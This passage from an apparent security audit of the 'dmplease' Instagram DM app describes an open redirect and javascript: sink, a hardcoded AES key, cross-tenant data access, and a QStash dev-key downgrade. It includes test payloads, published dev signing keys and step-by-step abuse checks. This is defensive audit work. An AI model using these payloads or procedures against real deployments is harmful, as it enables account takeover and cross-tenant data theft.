SignUpForm reads next (or callbackUrl) from the query string of the public /auth/sign-up page and assigns it to window.location.href after a sign-up that returns a session, with no same-origin or scheme check. When that branch is reached, an absolute or protocol-relative value is an open redirect, and a javascript: value is executed in the dmplease origin on assignment (subject to CSP). The sibling consumers normalize the same parameter: lib/supabase/proxy.ts:103 prefixes a leading slash, and app/auth/confirm/route.ts:22 does the same for the email-confirmation redirect, so this client sink is the inconsistent consumer. Reachability is gated on Supabase returning data.session from signUp, which depends on the live 'Confirm email' setting and on whether the auto-confirm side effect removed by supabase/migrations/20261127_remove_auto_confirm.sql is actually gone from the live database.

#### Claimed root cause

callbackUrl is taken verbatim from the query string and used as a navigation target without the same-origin normalization applied by the proxy and the confirm route, so an attacker-controlled scheme or host reaches window.location.href.

#### Where it lives (source trace)

- **entrypoint** — `components/sign-up-form.tsx:22` (SignUpForm): nextTarget is read verbatim from the next or callbackUrl query parameter of the public sign-up page.
- **propagation** — `components/sign-up-form.tsx:23` (SignUpForm): callbackUrl becomes nextTarget with no leading-slash, same-origin or scheme validation.
- **sink** — `components/sign-up-form.tsx:120` (SignUpForm.handleSignUp): After a sign-up that returns data.session, window.location.href = callbackUrl navigates to the attacker-controlled value; a javascript: value executes in the app origin.

#### Evidence

- `components/sign-up-form.tsx:22` — The source is the unauthenticated query string of a public page; the proxy only redirects authenticated visitors away from /auth/sign-up, so an anonymous crafted link reaches the component unchanged.
- `components/sign-up-form.tsx:120` — The value is assigned directly to window.location.href with no validation, inside the data.session branch.
- `lib/supabase/proxy.ts:103` — The sibling consumer normalizes next to a leading-slash path before redirecting, demonstrating the intended same-origin policy that this form omits.
- `app/auth/confirm/route.ts:22` — The email-confirmation redirect prefixes a leading slash when next does not already start with '/', neutralizing absolute scheme: and https://host values, so the confirm route is not an alternate path to the unnormalized sink.
- `next.config.ts:8` — The Next config object declares no headers() and no Content-Security-Policy appears anywhere in the repository, so no in-repo control blocks a javascript: navigation.

#### Why it is not confirmed

- Whether supabase.auth.signUp returns data.session is not visible in source: it depends on the live Supabase Auth 'Confirm email' setting and on whether the live handle_new_user function still contains the UPDATE auth.users SET email_confirmed_at = now() side effect that supabase/migrations/20261127_remove_auto_confirm.sql removes. The sink at components/sign-up-form.tsx:120 is only reached when data.session is non-null.
- No Content-Security-Policy is defined in the repository (next.config.ts declares no headers() and no CSP appears anywhere in the tree); a deployed script-src without 'unsafe-inline' would block the javascript: navigation, so the script-execution impact depends on the headers actually served. This does not affect the open-redirect impact, which CSP does not block.

#### How to resolve it

- **Bounded local check:** In a local build pointed at a Supabase project with 'Confirm email' disabled (so signUp returns a session), open /auth/sign-up?next=javascript:document.title%3D'pwned', complete sign-up, and observe whether the assignment executes; also test next=https://example.invalid to confirm the open redirect. Do not run against the deployed project or any shared Supabase instance.
- **Owner-observed check:** Owner checks the Supabase Auth 'Confirm email' setting, whether the live handle_new_user function still sets email_confirmed_at (the drift removed by supabase/migrations/20261127_remove_auto_confirm.sql), and the Content-Security-Policy header served on /auth/sign-up.

---

### 4.5 Hardcoded AES-256 vault key is unconditionally accepted when decrypting Instagram access tokens

**Fingerprint:** `dmplease/lib/config.ts:LEGACY_VAULT_SECRET/hardcoded-aes-key-accepted-by-decryptToken`

#### What it is

`lib/config.ts` commits a literal 64-hex AES-256 key as `LEGACY_VAULT_SECRET`, and `decryptToken` unconditionally appends it to the key list it tries. Because `keyFromSecret` treats a 64-hex string as raw key bytes, anyone who can read the source holds the key that decrypts tokens written while `TOKEN_VAULT_SECRET` was unset. Git history shows the literal was the encryption fallback in commit b1367ae (2026-11-24), before `TOKEN_VAULT_SECRET` was required. `instagram_accounts.access_token` ciphertext is readable by any authenticated workspace member through the `Members read instagram_accounts` RLS policy, which has no column restriction, so a member who can also read the source can recover the creator's Instagram access token and act as that account. The refresh cron re-encrypts a legacy row only when it is within 14 days of expiry, so legacy rows can persist.

#### Claimed root cause

A source-visible AES-256 key is accepted as a decryption key for stored Instagram access tokens, and no configuration removes it from the accepted key set.

#### Where it lives (source trace)

- **entrypoint** — `supabase/migrations/20261125_tier0_hardening.sql:56` (Members read instagram_accounts): SELECT policy for `instagram_accounts` is `is_workspace_member(workspace_id)` with no column restriction, so any authenticated workspace member can read `access_token` ciphertext through PostgREST.
- **propagation** — `lib/config.ts:12` (LEGACY_VAULT_SECRET): Hardcoded 64-hex AES-256 key committed to source.
- **propagation** — `lib/config.ts:100` (getLegacyVaultSecrets): Always returns LEGACY_VAULT_SECRET, even when TOKEN_VAULT_LEGACY_SECRET is configured to a different value.
- **propagation** — `lib/meta/vault.ts:80` (decryptToken): Appends every legacy key to the candidate key list after the current vault key.
- **propagation** — `lib/meta/vault.ts:82` (decryptToken): Iterates the key list and returns the first key whose GCM tag authenticates.
- **sink** — `lib/meta/vault.ts:84` (decryptToken): Returns the plaintext Instagram access token decrypted with the source-visible key.

#### Evidence

- `lib/config.ts:12` — `LEGACY_VAULT_SECRET` is a literal 64-hex string (a8b3e944…3a45c291).
- `lib/meta/vault.ts:8` — `keyFromSecret` uses a 64-hex secret directly as the 32-byte AES key, so the literal is the key, not a passphrase.
- `lib/config.ts:102` — `configured && configured !== LEGACY_VAULT_SECRET ? [configured, LEGACY_VAULT_SECRET] : [LEGACY_VAULT_SECRET]` — the hardcoded key is never removable.
- `lib/meta/vault.ts:80` — `decryptToken` always includes `getLegacyVaultSecrets()` in the key list.
- `supabase/migrations/20261125_tier0_hardening.sql:56` — `instagram_accounts` SELECT policy is `is_workspace_member(workspace_id)` with no column restriction, so any authenticated workspace member can read `access_token` ciphertext through PostgREST.
- `lib/meta/vault.ts:52` — `encryptToken` uses only `getVaultSecret()`, so the legacy key affects reads of rows written before `TOKEN_VAULT_SECRET` was configured.
- `lib/config.ts:11` — Comment: 'The key that older installs used when TOKEN_VAULT_SECRET was not configured.' Git history confirms commit b1367ae (2026-11-24) used this literal as the encryption fallback in `getVaultKey()`.
- `app/api/cron/refresh-tokens/route.ts:53` — The refresh cron calls `needsReEncryption()` and rewrites the token with `encryptToken()`, but only for accounts whose `token_expires_at` is within 14 days, so legacy rows can persist until refresh.
- `app/dashboard/layout.tsx:71` — The dashboard reads `instagram_accounts` with the user-session Supabase client, confirming the table is exposed through PostgREST to authenticated users under RLS.

#### Why it is not confirmed

- Whether any live `instagram_accounts.access_token` value is encrypted under `LEGACY_VAULT_SECRET` is a production data-state fact. Source shows the literal was the encryption fallback in commit b1367ae (2026-11-24) and `TOKEN_VAULT_SECRET` is documented present only from 2026-11-27, so pre-rotation rows are plausible but not established; the refresh cron re-encrypts a row only when it is within 14 days of expiry, so legacy rows can persist.
- Whether the repository or a build artifact containing `lib/config.ts` is visible to a lower-trust party is a deployment fact not visible in source.
- Whether the live Supabase project has `20261125_tier0_hardening.sql` applied and default `authenticated` SELECT grants on `instagram_accounts` is a deployment fact; the repo migration and the app's user-session reads indicate it is intended, but the live policy state is not observable offline.

#### How to resolve it

- **Bounded local check:** Executed in the approved sandbox (agents/v17/artifacts/check-output.json): with `TOKEN_VAULT_SECRET` set to a different 64-hex key and `TOKEN_VAULT_LEGACY_SECRET` unset, a ciphertext produced by `encryptToken` under `LEGACY_VAULT_SECRET` decrypts to the dummy plaintext; setting `TOKEN_VAULT_LEGACY_SECRET` to a third key still decrypts; a ciphertext under an unrelated key throws.
- **Owner-observed check:** Owner runs `needsReEncryption()` over every non-null `instagram_accounts.access_token` (read-only) to count legacy-encrypted rows, and confirms repository/artifact visibility. If the count is zero, the hardcoded key is inert for current data; if non-zero, rotate those tokens and remove the literal from the accepted key set.

---

### 4.6 Re-run stuck-item recovery uses the insert timestamp as the claim time and can re-queue work whose send already reached Meta

**Fingerprint:** `dmplease/lib/rerun-runner.ts:recoverStuckItems/created-at-as-claim-time`

#### What it is

`recoverStuckItems` decides an item is abandoned by comparing `rerun_job_items.created_at` (the insert time) against a five-minute cutoff. `created_at` is never updated when a worker claims an item, so for any job older than five minutes every item currently in `processing` matches the predicate, whether it is abandoned or still in flight. A second batch — from a QStash duplicate delivery, a retry, or a batch that outlived the 55-second lock — resets those items to `pending` and re-claims them. The live send path re-checks a 10-minute Redis recipient cooldown (consumed at check time) and a 30-day reply-once key before sending, so a concurrent re-claim is normally skipped while Redis is available; the duplicate becomes reachable when the first send succeeded but the process died before `markReplied`/`dm_logs` were written and the item is recovered after the cooldown expires, or when Redis is unavailable and both the lock and the cooldown fail open.

#### Claimed root cause

Stuck-item recovery uses the item insert timestamp instead of a claim timestamp, so it cannot distinguish an abandoned claim from an in-flight one and re-queues work that is still being processed.

#### Where it lives (source trace)

- **entrypoint** — `app/api/campaigns/rerun/route.ts:174` (POST /api/campaigns/rerun): Creates a `rerun_jobs` row with `status: queued`.
- **propagation** — `app/api/campaigns/rerun/route.ts:195` (POST /api/campaigns/rerun): Inserts `rerun_job_items` rows with `status: pending`; `created_at` defaults to insert time.
- **propagation** — `lib/rerun-runner.ts:227` (processBatch): Every batch calls `recoverStuckItems` before claiming work.
- **propagation** — `lib/rerun-runner.ts:122` (recoverStuckItems): Selects `status='processing' AND created_at < now-5m`; `created_at` is never updated when an item is claimed.
- **propagation** — `lib/rerun-runner.ts:135` (recoverStuckItems): Resets matching items to `pending` (or `failed` after three attempts).
- **propagation** — `lib/rerun-runner.ts:256` (processBatch): Compare-and-set claim moves `pending` to `processing` and increments `attempts`.
- **sink** — `lib/rerun-runner.ts:277` (processBatch): `processCommentEventForAutomation` sends the DM for the re-claimed item.

#### Evidence

- `supabase/migrations/20261126_rerun_jobs.sql:39` — `created_at timestamptz NOT NULL DEFAULT now()` — the only timestamp on an item before processing.
- `lib/rerun-runner.ts:258` — The claim update writes only `status` and `attempts`; no claim timestamp is recorded.
- `lib/rerun-runner.ts:122` — `recoverStuckItems` compares `created_at`, not a claim time.
- `app/api/workers/rerun/route.ts:6` — `maxDuration = 60` while the per-job lock TTL is 55s (`lib/rerun-runner.ts:82`), so a batch can outlive its lock.
- `lib/redis-lock.ts:40` — `acquireRedisLock` returns a `local` lock when Redis is unavailable, so two batches for the same job can run concurrently.
- `lib/meta/rate-limit.ts:208` — `checkRecipientCooldown` consumes its single 10-minute slot at check time (before the send), so it blocks a concurrent re-claim while Redis is available; it fails open when Redis is unavailable and expires before a crash-recovery re-claim after 10 minutes. The 24h `dm_logs` check only blocks when the first send wrote its log.

#### Why it is not confirmed

- No database fixture harness exists in the repository (`tests/` is pure-function only), so two concurrent batches against a dummy `rerun_jobs`/`rerun_job_items` pair cannot be driven locally.
- The duplicate requires a first send that reached Meta but did not write `markReplied`/`dm_logs` (a crash between `lib/meta/webhook-processor.ts:2419` and `:2430`) plus a re-claim after the 10-minute recipient cooldown, or Redis unavailability so the lock and cooldown fail open; that timing is not observable from source.
- A bounded local check could write `check-output.json`, but with no DB fixture harness a mock-only check would demonstrate only the re-claim, not the duplicate Meta delivery, so it would not resolve the decisive runtime timing question.

#### How to resolve it

- **Bounded local check:** With a dummy Postgres/Supabase fixture and Redis disabled (so the lock and cooldown fail open), insert one `rerun_jobs` row and one `rerun_job_items` row with `created_at = now() - 6 minutes`, set the item to `processing`, then call `runRerunBatch` twice; observe the second batch resets the item to `pending` and re-claims it. Stub `processCommentEventForAutomation` to record each invocation and confirm it is called twice for the same item; this demonstrates the re-claim, not the Meta delivery.
- **Owner-observed check:** Owner inspects `rerun_job_items` for rows whose `attempts > 1` and `status = 'sent'` with a single `dm_logs` row, checks for duplicate `dm_logs`/`safety_events` rows for the same recipient and automation, and checks QStash delivery logs for duplicate `/api/workers/rerun` invocations of the same `jobId`.

---

### 4.7 getToken substitutes a process-wide INSTAGRAM_ACCESS_TOKEN for a tenant's missing or undecryptable token

**Fingerprint:** `dmplease/meta/getToken/global-env-token-fallback`

#### What it is

getToken(instagramId, account) is supposed to return the credential bound to the Instagram account being acted for. When the stored token is absent, or when decryptToken throws because no configured vault key matches, it silently returns process.env.INSTAGRAM_ACCESS_TOKEN and ignores the instagramId argument entirely. That variable is undocumented (absent from .env.example and from every other file in the repository) and is never checked against the target account. Every webhook send path then calls sendDirectMessage with that single credential and the account id from the event, so a platform-wide token can be exercised on behalf of an account whose own token is missing, revoked, or unreadable.

#### Claimed root cause

The fallback branch of getToken returns a single process-wide environment credential instead of failing closed, breaking the binding between the credential and the Instagram account it is used for.

#### Where it lives (source trace)

- **entrypoint** — `app/api/webhook/route.ts:53` (POST /api/webhook): Anonymous/Meta POST entrypoint; verifyWebhookSignature at line 58 fails closed, then processWebhookPayload is invoked at line 151 (or the same payload is delivered by the QStash worker at app/api/workers/qstash/route.ts:42).
- **propagation** — `lib/meta/webhook-processor.ts:3165` (processWebhookPayload): Parses comment events and calls processCommentEventForAutomation at line 3247.
- **propagation** — `lib/meta/webhook-processor.ts:2541` (processCommentEventForAutomation): Resolves the account by event.instagramAccountId (line 2539) and calls getToken(event.instagramAccountId, account).
- **propagation** — `lib/meta/webhook-processor.ts:556` (getToken fallback): When account.access_token is null, or decryptToken throws, the function returns process.env.INSTAGRAM_ACCESS_TOKEN ?? null; instagramId is never consulted.
- **sink** — `lib/meta/client.ts:899` (sendDirectMessage): fetch POSTs to `${instagramApiBase(accessToken)}/${instagramAccountId}/messages` (URL built at line 893) with `Authorization: Bearer ${accessToken}` (line 903), exercising the fallback credential against the account id from the event.

#### Evidence

- `lib/meta/webhook-processor.ts:556` — `return process.env.INSTAGRAM_ACCESS_TOKEN ?? null;` — the fallback ignores instagramId and the account row.
- `lib/meta/webhook-processor.ts:552` — A decryptToken failure is caught and logged, then falls through to the environment token instead of failing closed.
- `lib/meta/vault.ts:90` — decryptToken throws when no configured vault key matches, which is the ordinary trigger for the fallback (for example after a TOKEN_VAULT_SECRET rotation).
- `.env.example:8` — The documented Meta configuration section lists META_APP_ID, META_APP_SECRET, META_CONFIG_ID and META_API_VERSION but not INSTAGRAM_ACCESS_TOKEN, so the fallback is undocumented configuration.

#### Why it is not confirmed

- Whether INSTAGRAM_ACCESS_TOKEN is set in the production environment is not visible in source or in .env.example; if it is unset, getToken returns null and every send path fails closed with 'No valid access token'.
- Whether that token is authorised for Instagram accounts other than the one it was issued for (for example a system-user token spanning several accounts) determines whether the fallback can act for another tenant's account or merely fails with a Meta error; Meta enforces that the bearer token is authorised for the account id in the request, so the fallback cannot send from an account the token does not cover.

#### How to resolve it

- **Bounded local check:** Static confirmation is sufficient: getToken (lib/meta/webhook-processor.ts:548-557) is module-private and its body returns process.env.INSTAGRAM_ACCESS_TOKEN ?? null after the account-token branch, with instagramId never referenced. If a runtime check is wanted, exercise an exported caller (e.g. processCommentEventForAutomation) with a stubbed admin DB returning access_token: null and a dummy INSTAGRAM_ACCESS_TOKEN, and assert the outbound fetch to /{instagramAccountId}/messages carries the env token.
- **Owner-observed check:** Owner confirms whether INSTAGRAM_ACCESS_TOKEN is present in the Vercel production environment and, if so, which Instagram account(s) that token is authorised to message (single account vs system-user token spanning tenants).

---

### 4.8 webhook_events retains full Meta payloads with contact PII and has no in-repo retention or tenant-cascade path

**Fingerprint:** `dmplease/webhook-events/retention-not-enforced`

#### What it is

Every signature-verified Meta webhook is copied verbatim into public.webhook_events, including comment text, commenter IGSID and username, and DM message bodies. The architecture document's retention table states 30 days for this table, but no in-repo code path deletes from it: the only retention cron prunes safety_events, and no SQL DELETE or pg_cron schedule exists in the migrations. The table also has no workspace_id column and stores instagram_account_id as plain text without a foreign key, so the explicit delete of instagram_accounts rows performed by POST /api/instagram/disconnect removes the account row while leaving every historical payload for that account in place. Absent an out-of-repo scheduled purge, the result is an unbounded copy of contact PII with no application purge path that outlives the connection it was collected for. The table is RLS deny-all and is read only by the service role and the cron-secret-protected /api/admin/webhook-replay route, so no lower-trust reader is demonstrated; the unresolved issue is the retention and deletion contract.

#### Claimed root cause

recordWebhookReceived inserts the whole webhook payload into a ledger table that has no retention job and no tenant linkage, so neither the documented 30-day cutoff nor workspace/account deletion can remove the rows.

#### Where it lives (source trace)

- **entrypoint** — `app/api/webhook/route.ts:94` (POST /api/webhook): After HMAC verification and the dedupe claim, the route calls recordWebhookReceived(payload) with the full parsed Meta body.
- **propagation** — `lib/meta/webhook-events.ts:19` (recordWebhookReceived): Inserts object, status, instagram_account_id and the entire payload jsonb into webhook_events; there is no TTL, size cap, or workspace column.
- **propagation** — `app/api/cron/safety-retention/route.ts:14` (POST /api/cron/safety-retention): The only retention job deletes from safety_events older than 30 days; webhook_events is never pruned by any scheduled or request path.
- **sink** — `supabase/migrations/20261125_tier0_hardening.sql:27` (webhook_events DDL): The table has no workspace_id and instagram_account_id is text without a foreign key, so workspace and account deletes cannot reach retained payloads; rows persist indefinitely absent an external purge.

#### Evidence

- `docs/09-architecture/SCALING_ARCHITECTURE.md:249` — Retention table states `webhook_events` retention is 30 days, establishing the intended lifecycle contract.
- `lib/meta/webhook-events.ts:25` — The insert stores `payload` (the complete webhook body) verbatim, including comment text and sender identifiers.
- `app/api/cron/safety-retention/route.ts:15` — The delete targets `safety_events` only, confirming webhook_events is outside the retention job.
- `supabase/migrations/20261125_tier0_hardening.sql:31` — `instagram_account_id text` with no REFERENCES clause and no workspace_id column, so no cascade can purge the ledger.
- `app/api/instagram/disconnect/route.ts:62` — Disconnect deletes the instagram_accounts rows for the user's workspaces, which leaves the corresponding webhook_events payloads orphaned but retained.
- `prisma/schema.prisma:368` — The Prisma model documents 'No workspace relation', confirming the ledger has no tenant linkage.
- `vercel.json:2` — The cron manifest lists only refresh-tokens, insights, alerts/check, safety-retention, and safety-digest; no webhook_events purge job is scheduled.

#### Why it is not confirmed

- No in-repo deletion path for webhook_events exists. The table is created in-repo by supabase/migrations/20261125_tier0_hardening.sql, but a pg_cron job or scheduled Edge Function created outside the repository (Supabase dashboard or SQL editor) could still prune it without appearing in source; supabase/migrations contains no pg_cron schedule and supabase/ has no functions directory.
- Whether the live project has such a scheduled job, and what cutoff it uses, is a deployment fact that cannot be observed from the repository.

#### How to resolve it

- **Bounded local check:** Against a local Postgres loaded with the webhook_events DDL from supabase/migrations/20261125_tier0_hardening.sql plus minimal safety_events and instagram_accounts fixtures, insert two webhook_events rows (one with received_at 40 days ago), run the exact delete issued by app/api/cron/safety-retention/route.ts (delete from safety_events where created_at < now() - interval '30 days'), and confirm the old webhook_events row still exists; then delete the instagram_accounts row for the account id and confirm the webhook_events row remains.
- **Owner-observed check:** Owner runs `select min(received_at), count(*) from public.webhook_events;` and inspects Supabase scheduled jobs / pg_cron (`select * from cron.job;`) for any DELETE against webhook_events, then disconnects a test Instagram account and re-checks whether its payloads remain.

---

### 4.9 Pending opt-in rows are dereferenced by id alone, letting one tenant release another tenant's campaign content and write into its workspace

**Fingerprint:** `dmplease:webhook:pending-dms-id-only-cross-tenant-deref`

#### What it is

A workspace member can insert a pending_dms row in their own workspace whose automation_id points at another tenant's automation. When the member's own Instagram account receives an inbound DM from the row's recipient_id (or the member sends an OPTIN postback for the row), the webhook resolves that row, loads the foreign automation with the service-role client without a workspace predicate, and sends the other tenant's campaign copy and button URL to the member. The same call writes contacts, dm_logs, safety_events and metric rows under the other tenant's workspace_id.

#### Claimed root cause

consumePending, loadPendingGateConfig and releasePendingOptin resolve pending_dms.automation_id and pending_dms.rule_id with the service-role client and no workspace binding, and releasePendingOptin adopts the loaded automation's workspace_id as the send and logging workspace instead of the pending row's workspace.

#### Where it lives (source trace)

- **entrypoint** — `app/api/webhook/route.ts:53` (POST): Meta's signed webhook is verified and handed to processWebhookPayload.
- **propagation** — `lib/meta/webhook-processor.ts:3512` (processWebhookPayload): The inbound-DM branch selects the newest live pending_dms row for the account's workspace and the sender IGSID, so a row the attacker inserted in their own workspace is selected.
- **propagation** — `lib/meta/webhook-processor.ts:3553` (processWebhookPayload): loadPendingGateConfig is called with the row's automation_id; inside it the automation is loaded by id with no workspace predicate (line 1798).
- **propagation** — `lib/meta/webhook-processor.ts:3610` (processWebhookPayload): releasePendingOptin is called with the unbound pending row.
- **propagation** — `lib/meta/webhook-processor.ts:1851` (releasePendingOptin): The automation is loaded by id only, so a row pointing at another tenant's automation resolves.
- **propagation** — `lib/meta/webhook-processor.ts:1877` (releasePendingOptin): sendOptinDm receives workspaceId equal to the loaded automation's workspace_id, i.e. the other tenant.
- **sink** — `lib/meta/webhook-processor.ts:3122` (sendOptinDm): The other tenant's campaign copy and button URL are delivered to the attacker-controlled IGSID, and the surrounding contacts, dm_logs, safety_events and metric writes target the other tenant.

#### Evidence

- `supabase/migrations/20261125_tier1_core.sql:87` — pending_dms.automation_id is a bare uuid with no foreign key or workspace constraint.
- `supabase/migrations/20261125_tier1_core.sql:155` — The insert policy only checks is_workspace_member(workspace_id), so a member may insert a row whose automation_id points at another tenant.
- `lib/meta/webhook-processor.ts:912` — consumePending selects by id and expiry only; there is no workspace, account or recipient predicate.
- `lib/meta/webhook-processor.ts:1798` — loadPendingGateConfig loads the automation with .eq("id", pending.automation_id) and no workspace filter.
- `lib/meta/webhook-processor.ts:1854` — releasePendingOptin loads the automation with .eq("id", pending.automation_id) and no workspace filter.
- `lib/meta/webhook-processor.ts:1877` — The send workspace is taken from the loaded automation, not from the pending row's workspace.
- `lib/meta/webhook-processor.ts:1858` — ensureContact writes a contact row into the loaded automation's workspace.
- `lib/meta/webhook-processor.ts:3143` — dm_logs is inserted under the loaded automation's workspace_id.
- `lib/public-report.ts:166` — Public report campaigns expose automation ids to report-link holders, giving an attacker a victim automation UUID.

#### Why it is not confirmed

- The cross-tenant read/write cannot be observed end-to-end locally: the repository has no database or Meta fixture harness, and the webhook path depends on a live Supabase project and the Meta Graph API. A stubbed unit test can show the code path but not the live insert/RLS or Meta delivery.
- Exploitability depends on the attacker obtaining a victim automation UUID. The source-visible leak paths (public report campaign ids in lib/public-report.ts, tracked-link utm_campaign in app/go/[slug]/route.ts) require the victim to share a report or tracked link; whether a given victim does so is a deployment/user fact, not source-visible.
- Whether the live Supabase project exposes pending_dms to authenticated inserts (RLS policy applied and table grants intact) is deployment-dependent; the migration defines the policy but not the live grant state.

#### How to resolve it

- **Bounded local check:** In a bounded sandbox, mock @/lib/db-admin so getAdminDb() returns a fake Supabase client: the pending_dms select returns a row with workspace_id=A, kind='optin', automation_id=<B automation>, comment_id='c1', recipient_id=<attacker IGSID>; the automations select returns B's automation; contacts/dm_logs/safety_events/metrics inserts are recorded. Mock @/lib/meta/client sendDirectMessage and @/lib/meta/follow-gate verifyFollowership (return 'follower'). Call processWebhookPayload with an inbound DM from the attacker IGSID to A's connected account. Assert sendDirectMessage is called with A's token/account and B's dm_message/button_url, and that contacts/dm_logs/safety_events/metrics writes carry workspace_id=B.
- **Owner-observed check:** Owner-observed in staging with RLS applied and dummy tenants A and B: as a member of A, insert a pending_dms row with workspace_id=A, kind='optin', automation_id=<B's automation id obtained from B's public report link>, comment_id='c1', recipient_id=<attacker IGSID>; DM A's connected account from the attacker IGSID; confirm B's campaign copy is delivered to the attacker and B's contacts/dm_logs/safety_events gain rows. Do not use real customer data.

---

### 4.10 Cross-tenant Instagram profile read and overwrite via unscoped syncInstagramProfile() in GET /api/instagram/media

**Fingerprint:** `lib/meta/profile-sync.ts/sync-instagram-profile-global-account-selection`

#### What it is

An authenticated creator who has a connected Instagram account calls GET /api/instagram/media. The route loads the caller's own instagram_accounts row through the RLS-scoped Supabase client (app/api/instagram/media/route.ts:23-48), then calls syncInstagramProfile() with no account id (line 68). syncInstagramProfile() uses the service-role client from lib/db-admin.ts, which bypasses RLS, to select the single instagram_accounts row with the greatest updated_at across every workspace (lib/meta/profile-sync.ts:68-77); the optional .eq('id', accountId) at line 75 is the only scoping and is skipped. It decrypts that row's access_token (line 82), calls Meta with that token (line 88), and updates the same row's profile_picture_url, followers_count, is_verified and updated_at (lines 101-109). The route then replaces its own profilePictureUrl, followersCount and isVerified with the synced values (lines 70-72) and returns them (lines 117-125). When the selected row belongs to another tenant, the caller receives that tenant's stored profile picture URL, follower count and verified flag, and the other tenant's row is rewritten. Because fetchInstagramProfile() does not check response.ok, a non-OK Meta body (for example an expired token) parses to an object with no profile fields, so profile_picture_url and followers_count are written as null over the victim's stored values; is_verified is not nulled because the code falls back to the stored value when the profile signal is null (lines 94-99). A thrown network error returns null and skips the update.

#### Claimed root cause

syncInstagramProfile() treats an omitted accountId as 'the most recently updated account in the whole table' instead of requiring a workspace-scoped account, and the service-role client bypasses RLS so the global selection is not constrained to the caller's tenant.

#### Where it lives (source trace)

- **entrypoint** — `app/api/instagram/media/route.ts:68` (GET /api/instagram/media): Calls syncInstagramProfile() with no account id after loading the caller's own account.
- **propagation** — `lib/meta/profile-sync.ts:73` (syncInstagramProfile): Queries instagram_accounts ordered by updated_at descending with limit 1 and no workspace_id predicate.
- **propagation** — `lib/meta/profile-sync.ts:82` (syncInstagramProfile): Decrypts the selected row's access_token, which may belong to another tenant.
- **propagation** — `lib/meta/profile-sync.ts:88` (syncInstagramProfile): Calls fetchInstagramProfile with the selected account's token, using another tenant's credential against Meta.
- **propagation** — `lib/meta/profile-sync.ts:101` (syncInstagramProfile): Updates the selected row's profile_picture_url, followers_count, is_verified and updated_at; a non-OK Meta body yields null profile_picture_url and followers_count that overwrite the victim's stored values, while is_verified falls back to the stored value.
- **sink** — `app/api/instagram/media/route.ts:70` (GET /api/instagram/media): Overwrites the response fields with the synced values and returns them at line 117.

#### Evidence

- `app/api/instagram/media/route.ts:68` — syncInstagramProfile() invoked without an account id.
- `lib/meta/profile-sync.ts:73` — .order("updated_at", { ascending: false }).limit(1) with no workspace filter.
- `lib/meta/profile-sync.ts:75` — The optional .eq("id", accountId) is the only scoping, and it is skipped here.
- `lib/meta/profile-sync.ts:104` — Update writes profile_picture_url and followers_count, which become null when Meta returns a non-OK body.
- `app/api/instagram/media/route.ts:122` — The response returns profilePictureUrl, isVerified and followersCount to the caller.

#### Why it is not confirmed

- Whether the live project has more than one tenant with a connected instagram_accounts row is a deployment data fact; with a single connected account no cross-tenant selection is possible, so this fact is decisive for the cross-tenant claim.
- Which instagram_accounts row has the greatest updated_at at request time is data-dependent and not source-visible; it identifies the affected tenant, and because the update also bumps updated_at the same row tends to remain selected.
- Whether the selected row's access_token decrypts and is accepted by Meta determines whether the write is a benign self-refresh or a nulling of the victim's stored profile_picture_url and followers_count; a thrown network error skips the update entirely.

#### How to resolve it

- **Bounded local check:** Add a vitest unit test that mocks @/lib/db-admin (hasAdminDb -> true, getAdminDb -> a chainable stub) and @/lib/meta/vault (decryptToken -> identity), seeds two dummy rows for tenants A and B with B.updated_at later than A.updated_at, and calls syncInstagramProfile() with no argument. Assert the select chain has no workspace_id predicate, decryptToken receives B's access_token, and the update is issued with .eq('id', B.id). Add a second case where the stubbed fetch returns a non-OK JSON error body and assert the update payload has profile_picture_url: null and followers_count: null. No network and no real credentials.
- **Owner-observed check:** In a staging project with two dummy tenants A and B, each with a connected Instagram account, set B's instagram_accounts.updated_at later than A's. Sign in as A, call GET /api/instagram/media, and compare the returned account.profilePictureUrl, followersCount and isVerified with B's stored row; then re-read B's row to confirm updated_at advanced. Repeat with B's token deliberately invalidated to observe whether B's profile_picture_url and followers_count are nulled. Use only dummy accounts; do not run against production or real creator accounts.

---

### 4.11 QStash worker verification can fall back to public development signing keys

**Fingerprint:** `qstash-receiver-dev-mode-public-signing-keys`

#### What it is

verifyQstashRequest constructs an @upstash/qstash Receiver with the configured signing keys but never sets devMode: false. In the pinned @upstash/qstash 2.13.0, Receiver.verify resolves dev mode from config.devMode and, when that is undefined, from the QSTASH_DEV environment variable; a value of "true" or "1" makes getReceiverSigningKeys discard the configured keys and return the package's hardcoded DEV_CREDENTIALS (other non-empty values throw, which fails closed). Those keys ship in the public npm package, so in a deployment that has both QSTASH signing keys configured and QSTASH_DEV set to "true"/"1", any caller can mint an upstash-signature over an arbitrary body and URL and drive the worker, which resolves the tenant from payload.entry[].id and sends DMs through that tenant's decrypted Instagram token. A bounded local check reproduced the downgrade: with QSTASH_DEV=true and real configured keys present, a JWT signed with the published dev current key verified; the same signature threw with QSTASH_DEV unset; a configured-key signature threw with QSTASH_DEV=true; QSTASH_DEV=false verified the configured-key signature.

#### Claimed root cause

The Receiver is constructed without devMode: false, leaving an environment-variable-controlled downgrade from the deployment signing keys to public development keys.

#### Where it lives (source trace)

- **entrypoint** — `app/api/workers/qstash/route.ts:23` (POST /api/workers/qstash): Any caller can POST a body plus an upstash-signature header to the worker; proxy.ts only refreshes the Supabase session and does not gate this route.
- **propagation** — `app/api/workers/qstash/route.ts:24` (POST /api/workers/qstash): The handler calls verifyQstashRequest(request) before parsing anything.
- **propagation** — `lib/qstash-verify.ts:19` (verifyQstashRequest): Constructs new Receiver({ currentSigningKey, nextSigningKey }) with no devMode option, so the library resolves dev mode from the environment.
- **propagation** — `lib/qstash-verify.ts:22` (verifyQstashRequest): Passes signature, body and url to Receiver.verify; a resolving verify returns the raw body to the caller.
- **sink** — `app/api/workers/qstash/route.ts:42` (POST /api/workers/qstash): The verified body is parsed and handed to processWebhookPayload, which resolves the tenant from payload.entry[].id via instagram_accounts, decrypts that account's token and sends DMs.

#### Evidence

- `lib/qstash-verify.ts:19` — The Receiver is constructed with only currentSigningKey and nextSigningKey; devMode is left undefined.
- `lib/upstash.ts:77` — getQstashSigningKeys returns the deployment keys that dev mode would override.
- `node_modules/@upstash/qstash/chunk-YEDZVUOH.mjs:924` — shouldUseDevelopmentMode returns true when QSTASH_DEV is "true" or "1", and Receiver.verify consults it before using the configured keys.
- `node_modules/@upstash/qstash/chunk-YEDZVUOH.mjs:513` — DEV_CREDENTIALS hardcodes the development signing keys sig_7kYjw48mhY7kAjqNGcy6cr29RJ6r and sig_5ZB6DVzB1wjE8S6rZ7eenA8Pdnhs in the published package.
